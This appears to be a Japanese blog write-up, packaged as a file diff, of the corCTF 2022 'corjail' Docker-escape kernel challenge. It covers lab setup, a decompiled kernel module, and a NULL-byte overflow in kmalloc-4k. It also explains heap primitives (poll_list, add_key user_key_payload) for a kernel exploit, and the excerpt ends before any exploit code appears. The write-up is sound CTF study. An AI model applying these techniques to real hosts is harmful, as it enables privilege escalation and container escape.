@@ -1,0 +1,1343 @@
+<!-- Converted by md2hatena-rs -->
+<div class="keywords"><span class="btitle">keywords</span>
+<p>
+kernel exploit / docker escape / poll_list / kROP on tty_struct / tty_file_private / setxattr
+</p>
+</div>
+<div class="contents">[:contents]</div>
+<h3>1. イントロ</h3>
+<p>いちにょっき、ににょっき、さんにょっき！！こんにちは、ニートです。
+最近は少しフロント周りを触っていたということで、となると反動でpwnがやりたくなる季節ですね。とはいっても今週からまた新しいインターンに行くことになっているので、様々な環境の変化に正気を保つのがギリギリな今日この頃。というわけで、今日は更に初めての経験をするべくdocker escape pwn問題を解いていきましょう。
+解くのは<strong>corCTF 2022</strong>の<strong>corjail</strong>という問題。確か前回のエントリでもcorCTFの問題を解いた気がするのですが、このCTFの問題はかなり好きです。初めてのdocker escape問題ということで、解いてる時に詰まったところや失敗したところ等も含めて書き連ねていこうと思います。まぁ詰まったところと言ってもwriteupをカンニングしたんですけどね。ただ、これは気をつけていることと言うかpwnのwriteupを先に見る時にいつもやることですが、writeupは薄目で見るようにしています。細かいexploit内容は読まずに、keyword的なものだけピックアップして、それらをどう使うかは自分でちゃんと考えるみたいな。カンニングするにしても、最初っから全部見ちゃうとおもしろみがなくなっちゃうので。このエントリでは、色々試行錯誤したり詰まったところも含めたデバッグ風景も一緒に書いていこうと思います。</p>
+<h3>2. devenv setup</h3>
+<p>まずは<a href="https://github.com/Crusaders-of-Rust/corCTF-2022-public-challenge-archive/tree/master/pwn/corjail/task/build">GitHub</a>から問題をcloneしてきます。
+配布ファイルがたくさんあるので、5分ほどuouoしましょう。
+続いて<code>build_kernel.sh</code>でKernelイメージをビルドします(スクリプト中だとシングルコアでビルドすることになっていて永遠に終わらないため、適宜修正しましょう)。
+なんか途中でSSL周りのエラーが出るため、<code>MODULES_SIG_ALL</code>らへんを無効化してしまいましょう。
+続いて、<code>build_image.sh</code>でゲストファイルシステムを作成します。一応いろいろなことをしているので、evilなことをされないか自分でスクリプトの中身を見ましょう。作成されるファイルは<code>build/corors/coros.qcow2</code>です。QCOW形式のファイルは、以下の感じでmount/umountできます:</p>
+<div class="codeblock-title">mount.bash</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-bash">### mount.bash
+#!/bin/bash
+set -eu
+
+MNTPOINT=/tmp/hoge
+QCOW=$(realpath &quot;${PWD}&quot;/../build/coros/coros.qcow2)
+
+sudo modprobe nbd max_part=8
+mkdir -p $MNTPOINT
+sudo qemu-nbd --connect=/dev/nbd0 &quot;$QCOW&quot;
+sudo fdisk -l /dev/nbd0
+sudo mount /dev/nbd0 $MNTPOINT
+
+### umount.bash
+#!/bin/bash
+
+set -eu
+MNTPOINT=/tmp/hoge
+
+sudo umount $MNTPOINT || true
+sudo qemu-nbd --disconnect /dev/nbd0
+sudo rmmod nbd
+</code></pre>
+<p>さて、最初に起動フローを把握しておきます。上のスクリプトでマウントされたファイルシステムを見ると、<code>/etc/inittab</code>は以下の感じです。</p>
+<div class="codeblock-title">inittab</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-txt">T0:23:respawn:/sbin/getty -L ttyS0 115200 vt100
+</code></pre>
+<p>普通ですね。続いて<code>/etc/init.d/docker</code>あたりにdockerデーモンのサービススクリプトがありますが、これもまあ普通なので割愛。<code>/etc/systemd/system/init.service</code>には以下のようにサービスが登録されています:</p>
+<div class="codeblock-title">/etc/systemd/system/init.service</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-txt">[Unit]
+Description=Initialize challenge
+
+[Service]
+Type=oneshot
+ExecStart=/usr/local/bin/init
+
+[Install]
+WantedBy=multi-user.target
+</code></pre>
+<p><code>ExecStart</code>である<code>/usr/local/bin/init</code>はこんな感じ:</p>
+<div class="codeblock-title">/usr/local/bin/init</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-txt">#!/bin/bash
+
+USER=user
+
+FLAG=$(head -n 100 /dev/urandom | sha512sum | awk '{printf $1}')
+
+useradd --create-home --shell /bin/bash $USER
+
+echo &quot;export PS1='\[\033[01;31m\]\u@CoROS\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]# '&quot;  &gt;&gt; /root/.bashrc
+echo &quot;export PS1='\[\033[01;35m\]\u@CoROS\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '&quot; &gt;&gt; /home/$USER/.bashrc
+
+chmod -r 0700 /home/$USER
+
+mv /root/temp /root/$FLAG
+chmod 0400 /root/$FLAG
+</code></pre>
+<p>新しいユーザ(<code>user</code>)を作って、PS1をイかした感じにして、<code>flag</code>をroot onlyにしているくらいです。続いて、<code>/etc/passwd</code>はこんな感じ:</p>
+<div class="codeblock-title">/etc/passwd</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-txt">root:x:0:0:root:/root:/usr/local/bin/jail
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+(snipped...)
+</code></pre>
+<p><code>root</code>のログインシェルが<code>/usr/local/bin/jail</code>になっています:</p>
+<div class="codeblock-title">/usr/local/bin/jail</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-txt">#!/bin/bash
+
+echo -e '[\033[5m\e[1;33m!\e[0m] Spawning a shell in a CoRJail...'
+/usr/bin/docker run -it --user user --hostname CoRJail --security-opt seccomp=/etc/docker/corjail.json -v /proc/cormon:/proc_rw/cormon:rw corcontainer
+/usr/sbin/poweroff -f
+</code></pre>
+<p><code>user</code>としてdockerを起動したあと、<code>poweroff</code>をしていますね。ここがメインの処理みたいです。<code>--security-opt seccomp=/etc/docker/corjail.json</code>を指定していますが、seccomp filterの内容は後ほど見ていくことにします。<code>/proc/cormon</code>という謎のproc fsもバインドマウントしていますが、これも後ほど見ていくことにします。
+というわけで、ゲストOSのroot(not on docker)を触りたいときには、<code>/etc/passwd</code>のログインシェルを<code>/bin/bash</code>あたりにしておけばいいことがわかりました。rootで<code>docker images</code>してみると、以下の感じ:</p>
+<div class="codeblock-title">.bash</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-bash">root@CoROS:~# docker images
+REPOSITORY     TAG             IMAGE ID       CREATED        SIZE
+corcontainer   latest          8279763e02ce   2 months ago   84.7MB
+debian         bullseye-slim   c9cb6c086ef7   3 months ago   80.4MB
+</code></pre>
+<p>先程<code>jail</code>の中でも指定されていた<code>corcontainer</code>がありますね。これはどうやってつくられたのでしょう。<code>build_image.sh</code>を見てみると、以下の記述があります:</p>
+<div class="codeblock-title">build_image.sh</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-sh">tar -xzvf coros/files/docker/image/image.tar.gz -C coros/files/docker
+cp -rp coros/files/docker/var/lib/docker $FS/var/lib/
+rm -rf coros/files/docker/var
+</code></pre>
+<p>Docker imageは予め作られたものを使っているようです。デバッグ時には常に最新のexploitをguest OSのdockerコンテナ上に置いておきたいので、<code>/usr/local/bin/jail</code>を以下のように変更しておきましょう:</p>
+<div class="codeblock-title">/usrr/local/bin/jail</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-txt">#!/bin/bash
+
+echo -e '[\033[5m\e[1;33m!\e[0m] Spawning a shell in a CoRJail...'
+cp /exploit /home/user || echo &quot;[!] exploit not found, skipping&quot;
+chown -R user:user /home/user
+echo 0 &gt; /proc/sys/kernel/kptr_restrict
+/usr/bin/docker run -it --user root \
+  --hostname CoRJail \
+  --security-opt seccomp=/etc/docker/corjail.json \
+  --add-cap CAP_SYSLOG \
+  -v /proc/cormon:/proc_rw/cormon:rw \
+  -v /home/user/:/home/user/host \
+  corcontainer
+/usr/sbin/poweroff -f
+</code></pre>
+<p>あとは<code>exploit</code>をguestのファイルシステムにおいておけば、勝手にコンテナ内の<code>/home/user/exploit</code>に配置されて便利ですね。ついでに<code>CAP_SYSLOG</code>を与えることで<code>/proc/kallsysm</code>を見れるようにしています。
+因みに諸々のめんどくさいことは、<a href="https://github.com/smallkirby/lysithea">lysithea</a>が全部面倒見てくれるので、最初のセットアップを除くと実際には以下のコマンドを打つだけです:</p>
+<div class="codeblock-title">lysithea.bash</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-bash">lysithea init # first time only
+lysithea extract # first time only
+lysithea local
+</code></pre>
+<h3>3. static analysis</h3>
+<h4>misc</h4>
+<p>lysithea曰く:</p>
+<div class="codeblock-title">lysithea.bash</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-bash">root@CoRJail:/home/user/host# ./drothea --verbose
+Drothea v1.0.0
+[.] kernel version:
+        Linux version 5.10.127 (root@VPS) (gcc (Debian 8.3.0-6) 8.3.0, GNU ld (GNU Binutils for Debian) 2.31.1) #2 SMP Thu January 1 00:00:00 UTC 2030
+[-] CONFIG_KALLSYMS_ALL is enabled.
+[!] unprivileged ebpf installation is enabled.
+cat: /proc/sys/vm/unprivileged_userfaultfd: No such file or directory
+[-] unprivileged userfaultfd is disabled.
+[?] KASLR seems enabled. Should turn off for debug purpose.
+[?] kptr seems restricted. Should try 'echo 0 &gt; /proc/sys/kernel/kptr_restrict' in init script.
+root@CoRJail:/home/user/host# ./ingrid --verbose
+Ingrid v1.0.0
+[-] userfualtfd is disabled.
+[-] CONFIG_DEVMEM is disabled.
+</code></pre>
+<p>基本的セキュリティ機構は全部有効です。さて、kernelのビルドスクリプト(<code>build_kernel.sh</code>を読むと、以下のようなパッチがあたっています:</p>
+<div class="codeblock-title">patch.diff</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-diff">diff -ruN a/arch/x86/entry/syscall_64.c b/arch/x86/entry/syscall_64.c
+--- a/arch/x86/entry/syscall_64.c	2022-06-29 08:59:54.000000000 +0200
++++ b/arch/x86/entry/syscall_64.c	2022-07-02 12:34:11.237778657 +0200
+@@ -17,6 +17,9 @@
+ 
+ #define __SYSCALL_64(nr, sym) [nr] = __x64_##sym,
+ 
++DEFINE_PER_CPU(u64 [NR_syscalls], __per_cpu_syscall_count);
++EXPORT_PER_CPU_SYMBOL(__per_cpu_syscall_count);
++
+ asmlinkage const sys_call_ptr_t sys_call_table[__NR_syscall_max+1] = {
+ 	/*
+ 	 * Smells like a compiler bug -- it doesn't work
+diff -ruN a/arch/x86/include/asm/syscall_wrapper.h b/arch/x86/include/asm/syscall_wrapper.h
+--- a/arch/x86/include/asm/syscall_wrapper.h	2022-06-29 08:59:54.000000000 +0200
++++ b/arch/x86/include/asm/syscall_wrapper.h	2022-07-02 12:34:11.237778657 +0200
+@@ -219,9 +220,41 @@
+ 
+ #define SYSCALL_DEFINE_MAXARGS	6
+ 
+-#define SYSCALL_DEFINEx(x, sname, ...)				\
+-	SYSCALL_METADATA(sname, x, __VA_ARGS__)			\
+-	__SYSCALL_DEFINEx(x, sname, __VA_ARGS__)
++DECLARE_PER_CPU(u64[], __per_cpu_syscall_count);
++
++#define SYSCALL_COUNT_DECLAREx(sname, x, ...) \
++	static inline long __count_sys##sname(__MAP(x, __SC_DECL, __VA_ARGS__));
++
++#define __SYSCALL_COUNT(syscall_nr) \
++	this_cpu_inc(__per_cpu_syscall_count[(syscall_nr)])
++
++#define SYSCALL_COUNT_FUNCx(sname, x, ...)					\
++	{									\
++		__SYSCALL_COUNT(__syscall_meta_##sname.syscall_nr);		\
++		return __count_sys##sname(__MAP(x, __SC_CAST, __VA_ARGS__));	\
++	}									\
++	static inline long __count_sys##sname(__MAP(x, __SC_DECL, __VA_ARGS__))
++
++#define SYSCALL_COUNT_DECLARE0(sname) \
++	static inline long __count_sys_##sname(void);
++
++#define SYSCALL_COUNT_FUNC0(sname)					\
++	{								\
++		__SYSCALL_COUNT(__syscall_meta__##sname.syscall_nr);	\
++		return __count_sys_##sname();				\
++	}								\
++	static inline long __count_sys_##sname(void)
++
++#define SYSCALL_DEFINEx(x, sname, ...)			\
++	SYSCALL_METADATA(sname, x, __VA_ARGS__)		\
++	SYSCALL_COUNT_DECLAREx(sname, x, __VA_ARGS__)	\
++	__SYSCALL_DEFINEx(x, sname, __VA_ARGS__)	\
++	SYSCALL_COUNT_FUNCx(sname, x, __VA_ARGS__)
++
++#define SYSCALL_DEFINE0(sname)		\
++	SYSCALL_COUNT_DECLARE0(sname)	\
++	__SYSCALL_DEFINE0(sname)	\
++	SYSCALL_COUNT_FUNC0(sname)
+
+(snpped...)
+</code></pre>
+<p>これは<a href="https://lwn.net/Articles/896474/">procfsにsyscallのanalyticsを追加するパッチ</a>みたいです。パッチからもわかるように、各CPUに<code>__per_cpu_syscall_count</code>という変数が追加され、syscallの呼び出し回数を記録するようになっています。</p>
+<h4>module analysis (rev)</h4>
+<p>続いて、本問題のメインであるカーネルモジュール(<code>cormon.ko</code>)を見ていきます。そして気づく、ソースコードが配布されてない！！！きっとおっちょこちょいでソースを配布し忘れてしまったんでしょう。仕方がないのでGhidraで見ていきましょう。デコンパイルして適当に見やすく整形するとこんな感じ:</p>
+<div class="codeblock-title">decompiled.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">char *initial_filter = &quot;sys_execve,sys_execveat,sys_fork,sys_keyctl,sys_msgget,sys_msgrcv,sys_msgsnd,sys_poll,sys_ptrace,sys_setxattr,sys_unshare&quot;;
+
+struct proc_ops cormon_proc_ops = {
+  .proc_open = cormon_proc_open,
+  .proc_write = cormon_proc_write,
+  .proc_read = seq_read,
+};
+
+struct seq_operations cormon_seq_ops = {
+  .start = cormon_seq_start,
+  .stop = cormon_seq_stop,
+  .next = cormon_seq_next,
+  .show = cormon_seq_show,
+};
+
+int init_module(void) {
+  printk(&quot;6[CoRMon::Init] Initializing module...\n&quot;);
+  if (proc_create(&quot;cormon&quot;, 0x1B5, 0, cormon_proc_ops) != 0) {
+    return -0xC;
+  }
+  if (update_filter(initial_filter) != 0) {
+    return -0x16;
+  }
+  
+  printk(&quot;3[CoRMon::Error] proc_create() call failed!\n&quot;);
+  return 0;
+}
+
+void cormon_proc_open(struct *inode inode, struct file *fp) {
+  seq_open(fp, cormon_seq_ops);
+  return;
+}
+
+ssize_t cormon_proc_write(struct file *fp, const char __user *ubuf, size_t size, loff_t *offset) {
+  size_t sz;
+  char *heap;
+  if (*offset &lt; 0) return 0xffffffffffffffea;
+  if (*offset &lt; 0x1000 &amp;&amp; size != 0) {
+    if (0x1000 &lt; size) sz = 0xFFF;
+    heap = kmem_cache_alloc_trace(?, 0xA20, 0x1000);
+    printk(&quot;6[CoRMon::Debug] Syscalls @ %#llx\n&quot;);
+    if (heap == NULL) {
+      printk(&quot;3[CoRMon::Error] kmalloc() call failed!\n&quot;);
+      return 0xfffffffffffffff4;
+    }
+    if (copy_from_user(heap, ubuf, sz) != 0) {
+      printk(&quot;3[CoRMon::Error] copy_from_user() call failed!\n&quot;);
+      return 0xfffffffffffffff2;
+    }
+    heap[sz] = NULL;
+    if (update_filter(heap)) {
+      kfree(heap);
+    } else {
+      kfree(heap);
+      return 0xffffffffffffffea;
+    }
+  }
+  return 0;
+}
+
+long update_filter(char *syscall_str) {
+  char *syscall;
+  int syscall_nr;
+  char syscall_list[?] = {0};
+  
+  while(syscall = strsep(syscall, &quot;,&quot;) &amp;&amp; syscall != NULL &amp;&amp; syscall_str != NULL) {
+    if((syscall_nr = get_syscall_nr(syscall)) &lt; 0) {
+      printk(&quot;3[CoRMon::Error] Invalid syscall: %s!\n&quot;, syscall);
+      return 0xffffffea;
+    }
+    syscall_list[syscall_nr] = 1;
+  }
+  
+  memcpy(filter, syscall_list, 0x37 * 8);
+}
+
+int cormon_seq_show(struct seq_file *sfp, void *vp) {
+  ulong v = *vp;
+  if (v == 0) {
+    int n = -1;
+    seq_putc(sfp, 0xA);
+    while((n = cpumask_next(n, &amp;__cpu_online_mask)) &lt; _nr_cpu_ids) { // for_each_cpu macro?
+      seq_printf(sfp, &quot;%9s%d&quot;, &quot;CPU&quot;, n);
+    }
+    seq_printf(sfp, &quot;\tSyscall (NR)\n\n&quot;);
+  }
+  
+  if (filtter[v] != 0) {
+    if((name = get_syscall_name(v)) == 0) return 0;
+    int n = -1;
+    while((n = cpumask_next(n, &amp;__cpu_online_mask)) &lt; _nr_cpu_ids) {
+      seq_printf(sfp, &quot;%10sllu&quot;, &quot;CPU&quot;, __per_cpu_syscall_count[v]); // PER_CPU macro?
+    }
+    seq_printf(sfp, &quot;\t%s (%lld)\n&quot;, name, v);
+  }
+  if (v == 0x1B9) seq_putc(sfp, 0xA);
+  
+  return 0;
+}
+
+void* cormon_seq_next(struct seq_file *fp, void *v, loff_t *pos_p) {
+  loff_t pos = *pos_p;
+  *pos_p++;
+  if (pos &lt; 0x1BA) return pos_p;
+  return 0;
+}
+
+void* cormon_seq_stop(struct seq_file *fp, void *v) {
+  return NULL;
+}
+
+void* cormon_seq_start(struct seq_file *fp, loff_t *pos_p) {
+  if (*pos_p &lt; 0x1BA) return pos_p;
+  else return 0;
+}
+</code></pre>
+<p>まぁ内容は簡単なのでrev自体はそんなに難しくないです。
+やっていることとしては、上述のpatchによって導入されたPERCPUな変数<code>__per_cpu_syscall_count</code>を表示するインタフェースを作っています。このカウンタはpatchされたsyscallの先頭において<code>__SYSCALL_COUNT()</code>でインクリメントされます。このインクリメントは、モジュール内の<code>filter</code>には関係なく全てのsyscallに対して行われます。<code>cormon</code>モジュールは、<code>proc</code>に生やしたファイルを<code>read</code>することで<code>filter</code>が有効になっているsyscallの統計結果だけを表示しているようにしており、また書き込みを行うことで<code>filter</code>の値を更新することができるように成っています。<code>update_filter()</code>を見るとわかるように、更新方法は<code>/proc_rw/cormon</code>にsyscallの名前をカンマ区切りで書き込みます(Dockerの起動時に<code>-v /proc/cormon:/proc_rw/cormon:rw</code>としてホストのデバイスファイルをゲストにRWでバインドマウントしています)。
+実際に使ってみるとこんな感じ:
+<figure class="figure-image figure-image-fotolife mceNonEditable" title=""><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163359.png" alt="" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable"></figcaption></figure></p>
+<h4>seccomp</h4>
+<p><code>seccomp.json</code>(のちに<code>corjail.json</code>としてVM内にコピーされる)には、以下のように<code>defaultAction: SCMP_ACT_ERRNO</code>でフィルターが設定されています:</p>
+<div class="codeblock-title">seccomp.json</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-json">{
+	&quot;defaultAction&quot;: &quot;SCMP_ACT_ERRNO&quot;,
+	&quot;defaultErrnoRet&quot;: 1,
+	&quot;syscalls&quot;: [
+		{
+            &quot;names&quot;: [ &quot;_llseek&quot;, &quot;_newselect&quot;, (snipped...)],
+			&quot;action&quot;: &quot;SCMP_ACT_ALLOW&quot;
+		},
+		{
+			&quot;names&quot;: [ &quot;clone&quot; ],
+			&quot;action&quot;: &quot;SCMP_ACT_ALLOW&quot;,
+			&quot;args&quot;: [ { &quot;index&quot;: 0, &quot;value&quot;: 2114060288, &quot;op&quot;: &quot;SCMP_CMP_MASKED_EQ&quot; } ]
+		}
+	]
+}
+
+</code></pre>
+<p>許可されていないsyscallは、おおよそ以下のとおりです(雑に比較したので多少ずれはあるかも):</p>
+<div class="codeblock-title">disallowed.txt</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-txt">msgget
+msgsnd
+msgrcv
+msgctl
+ptrace
+syslog
+uselib
+personality
+ustat
+sysfs
+vhangup
+pivot_root
+_sysctl
+chroot
+acct
+settimeofday
+mount
+umount2
+swapon
+swapoff
+reboot
+sethostname
+setdomainname
+iopl
+ioperm
+create_module
+init_module
+delete_module
+get_kernel_syms
+query_module
+quotactl
+nfsservctl
+getpmsg
+putpmsg
+afs_syscall
+tuxcall
+security
+lookup_dcookie
+clock_settime
+vserver
+mbind
+set_mempolicy
+get_mempolicy
+mq_open
+mq_unlink
+mq_timedsend
+mq_timedreceive
+mq_notify
+mq_getsetattr
+kexec_load
+request_key
+migrate_pages
+unshare
+move_pages
+perf_event_open
+fanotify_init
+name_to_handle_at
+open_by_handle_at
+setns
+process_vm_readv
+process_vm_writev
+kcmp
+finit_module
+kexec_file_load
+bpf
+userfaultfd
+pkey_mprotect
+pkey_alloc
+pkey_free
+</code></pre>
+<p><code>unshare, mount, msgget, msgsnd, userfaultfd, bpf</code>らへんが禁止されていますね。</p>
+<p>ちなみに、Ubuntu22.04環境でpthreadを含めてstatic buildしたバイナリをコンテナ上で動かそうとしたところ、<code>Operation not permitted</code>になりました。<a href="https://blog.jp.square-enix.com/iteng-blog/posts/00016-wsl2-gui-seccomp-issue/">Dockerには多分seccompでひっかかったsyscallのレポート機能がない</a>ため、手動と勘で問題になっているsyscallを探したところ、<code>clone3</code> syscallが問題になっているようでした。よって、<code>seccomp.json</code>に以下のようなパッチを当てました(writeupを見た感じ、pthreadの使用は意図しているため、pthreadを含む環境の違いっぽい?):</p>
+<div class="codeblock-title">seccomp.patch</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-patch">--- a/../build/coros/files/docker/seccomp.json
++++ b/./seccomp.json
+@@ -10,6 +10,10 @@
+                        &quot;names&quot;: [ &quot;clone&quot; ],
+                        &quot;action&quot;: &quot;SCMP_ACT_ALLOW&quot;,
+                        &quot;args&quot;: [ { &quot;index&quot;: 0, &quot;value&quot;: 2114060288, &quot;op&quot;: &quot;SCMP_CMP_MASKED_EQ&quot; } ]
++               },
++               {
++                       &quot;names&quot;: [ &quot;clone3&quot; ],
++                       &quot;action&quot;: &quot;SCMP_ACT_ALLOW&quot;
+                }
+        ]
+ }
+</code></pre>
+<h3>4. Vuln: NULL-byte overflow</h3>
+<p>バグはGhidraのデコンパイル結果を見ると明らかです。
+<code>common_proc_write()</code>ではユーザから渡されたsyscallの文字列を<code>heap</code>(kmalloc-4k)にコピーしています。その後、<code>heap</code>の最後をNULL終端しようとしていますが、<code>size</code>が<code>0x1000</code>の時にNULL-byte overflowするようになっています:</p>
+<div class="codeblock-title">.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">common_proc_write() {
+  if (0x1000 &lt; size) sz = 0xFFF;
+  if (copy_from_user(heap, ubuf, sz) != 0) {...}
+  ...
+  heap[sz] = NULL;
+  ...
+}
+</code></pre>
+<p>使われるスラブキャッシュは<code>kmalloc-4k</code>です。<a href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628">コレ</a>とかを見ると、まぁ使えそうな構造体はあるように思えますが、今回はseccompでフィルターされているため1K以上のキャッシュで使える構造体はこのリストには見当たりません。最近のkernelpwn追ってないしここでお手上げに成ったので、writeupをカンニングしました、チート最高！</p>
+<h3>5. pre-requisites</h3>
+<h4><code>sys_poll</code></h4>
+<p><code>sys_poll()</code>が使えるらしい。ソースはこんな感じ(余計なところは省略している):</p>
+<div class="codeblock-title">fs/select/select.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">#define FRONTEND_STACK_ALLOC	256
+#define POLL_STACK_ALLOC	FRONTEND_STACK_ALLOC
+#define N_STACK_PPS ((sizeof(stack_pps) - sizeof(struct poll_list))  / \
+			sizeof(struct pollfd))
+#define POLLFD_PER_PAGE  ((PAGE_SIZE-sizeof(struct poll_list)) / sizeof(struct pollfd))            
+struct pollfd {
+	int fd;
+	short events;
+	short revents;
+}; /* size: 8, cachelines: 1, members: 3 */
+struct poll_list {
+	struct poll_list *next;
+	int len;
+	struct pollfd entries[];
+}; /* size: 16, cachelines: 1, members: 3 */
+
+static int do_sys_poll(struct pollfd __user *ufds, unsigned int nfds,
+		struct timespec64 *end_time)
+{
+	struct poll_wqueues table;
+	long stack_pps[POLL_STACK_ALLOC/sizeof(long)];
+	struct poll_list *const head = (struct poll_list *)stack_pps;
+ 	struct poll_list *walk = head;
+
+	len = min_t(unsigned int, nfds, N_STACK_PPS);
+	for (;;) {
+		walk-&gt;next = NULL;
+		walk-&gt;len = len;
+		if (!len)
+			break;
+
+		if (copy_from_user(walk-&gt;entries, ufds + nfds-todo,
+					sizeof(struct pollfd) * walk-&gt;len))
+			goto out_fds;
+
+		todo -= walk-&gt;len;
+		if (!todo)
+			break;
+
+		len = min(todo, POLLFD_PER_PAGE);
+		walk = walk-&gt;next = kmalloc(struct_size(walk, entries, len),
+					    GFP_KERNEL);
+		if (!walk) {
+			err = -ENOMEM;
+			goto out_fds;
+		}
+	}
+
+	fdcount = do_poll(head, &amp;table, end_time);
+
+	err = fdcount;
+out_fds:
+	walk = head-&gt;next;
+	while (walk) {
+		struct poll_list *pos = walk;
+		walk = walk-&gt;next;
+		kfree(pos);
+	}
+
+	return err;
+}
+</code></pre>
+<p>まずユーザランドから渡された<code>pollfd</code>リストをスタック上の<code>stack_pps</code>に最大256byte分コピーします。厳密には、<code>next, len</code>メンバ分の16byteを除いた240byte分(つまり<code>struct pollfd</code>の30個分)をスタック上にコピーします。もしそれ以上の<code>ufds</code>が渡された場合には、次は最大で<code>POLLFD_PER_PAGE ((4096-16)/8 == 510)</code>個数分だけ<code>kmalloc()</code>してコピーします。つまり、使われるスラブキャッシュはkmalloc-32 ~ kmalloc-4kのどれか(<code>next, len</code>の分があるためkmalloc-16以下には入らない)です。こうして、256byteのstackと、32~4Kのheapに<code>struct poll_list</code>と<code>pollfd</code>をコピーしたあと、それらを<code>next</code>ポインタで繋いでリストを作っています。freeは、リストの先頭から順に<code>kfree</code>で単純に解放してます。
+なるほど、たしかにこの構造体はkmalloc-32~4kの任意のサイズのキャッシュへのポインタを持つことができて、且つfreeはタイマーでも任意のタイミングでもできるため便利そう。
+前述のNULL-byte overflowを使って<code>struct pollfd</code>の<code>next</code>をpartial overwriteすることで、そのスラブに入っているオブジェクトをUAF(read)できそうです。問題は、<code>msgXXX</code>系のsyscallがフィルターされている状況で、どの構造体を使ってreadするか。</p>
+<h4><code>add_key</code> / <code>keyctl</code> syscall</h4>
+<p>まぁ勿論カンニングしたんですが。<code>add_key</code>というシステムコールがあるらしい。知らんがな。そういえば、seccompのフィルターを見ると<a href="https://docs.docker.com/engine/security/seccomp/">デフォルトの設定</a>では許可されていないのにこの問題では許可されています。ソースはこんな感じ:</p>
+<div class="codeblock-title">fs/select.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">// security/keys/user_defined.c
+struct key_type key_type_user = {
+	.name			= &quot;user&quot;,
+	.preparse		= user_preparse,
+	.free_preparse		= user_free_preparse,
+	.instantiate		= generic_key_instantiate,
+	.update			= user_update,
+	.revoke			= user_revoke,
+	.destroy		= user_destroy,
+	.describe		= user_describe,
+	.read			= user_read,
+};
+int user_preparse(struct key_preparsed_payload *prep)
+{
+  struct user_key_payload *upayload;
+  size_t datalen = prep-&gt;datalen;
+
+  if (datalen &lt;= 0 || datalen &gt; 32767 || !prep-&gt;data)
+      return -EINVAL;
+
+  upayload = kmalloc(sizeof(*upayload) + datalen, GFP_KERNEL);
+  ...
+}
+
+// security/keys/keyctl.c
+SYSCALL_DEFINE5(add_key, const char __user *, _type,
+		const char __user *, _description, const void __user *, _payload,
+		size_t, plen, key_serial_t, ringid)
+{
+  key_ref_t keyring_ref, key_ref;
+  char type[32], *description;
+  void *payload;
+  long ret;
+
+  /* draw all the data into kernel space */
+  ret = key_get_type_from_user(type, _type, sizeof(type));
+  description = NULL;
+  if (_description) {...}
+
+  /* pull the payload in if one was supplied */
+  payload = NULL;
+
+  if (plen) {
+      ...
+      if (copy_from_user(payload, _payload, plen) != 0)
+          goto error3;
+  }
+
+  keyring_ref = lookup_user_key(ringid, KEY_LOOKUP_CREATE, KEY_NEED_WRITE);
+  key_ref = key_create_or_update(keyring_ref, type, description,
+                     payload, plen, KEY_PERM_UNDEF, KEY_ALLOC_IN_QUOTA);
+  ...
+}
+
+// security/keys/key.c
+key_ref_t key_create_or_update(key_ref_t keyring_ref,
+			       const char *type,
+			       const char *description,
+			       const void *payload,
+			       size_t plen,
+			       key_perm_t perm,
+			       unsigned long flags)
+{
+  struct keyring_index_key index_key = {
+      .description	= description,
+  };
+  struct key_preparsed_payload prep;                       
+    
+  index_key.type = key_type_lookup(type);
+  memset(&amp;prep, 0, sizeof(prep));
+  ...
+  if (index_key.type-&gt;preparse) {
+      ret = index_key.type-&gt;preparse(&amp;prep);
+      ...
+  }
+  ...
+  ret = __key_instantiate_and_link(key, &amp;prep, keyring, NULL, &amp;edit);
+  ...
+}
+</code></pre>
+<p>はい。<a href="https://man7.org/linux/man-pages/man2/add_key.2.html">manpage</a>によると、<code>keyring</code>, <code>user</code>, <code>logon</code>, <code>bigkey</code>という4種類の鍵があります。そしてそのそれぞれについてfopsみたいな<code>struct key_type</code>構造体が結びついています。このハンドラの中の、ユーザ入力ペイロードをパースする関数である<code>.preparse</code>は、<code>user</code>タイプの場合<code>user_preparse()</code>関数に成っています。<code>user_preparse()</code>は、<code>user_key_payload</code>構造体を<code>kmalloc</code>します。この構造体はこれまた可変サイズを持ち、最大<code>sizeof(struct user_key_payload) + 32767</code>までの任意のサイズをユーザ指定で確保することができます。解放も、ユーザが任意のタイミングで行うことができます(<a href="https://man7.org/linux/man-pages/man3/keyctl_revoke.3.html"><code>keyctl_revoke</code></a>)。<a href="https://man7.org/linux/man-pages/man3/keyctl_read.3.html">読むこと</a>も、できます。素晴らしい構造体ですね、全くどうやってこんなもんを見つけてくるのやら。おまけに、<strong>特筆すべきこととして最初のメンバである<code>rcu</code>は初期化されるまではもとの値が保たれるみたいです</strong>。ふぅ。</p>
+<h3>6. kbase leak via <code>user_key_payload</code> and <code>seq_operations</code></h3>
+<p>さて、これらの材料を使うとkernbaseがリークできそうです。細かい事は無視して大枠だけ考えます。
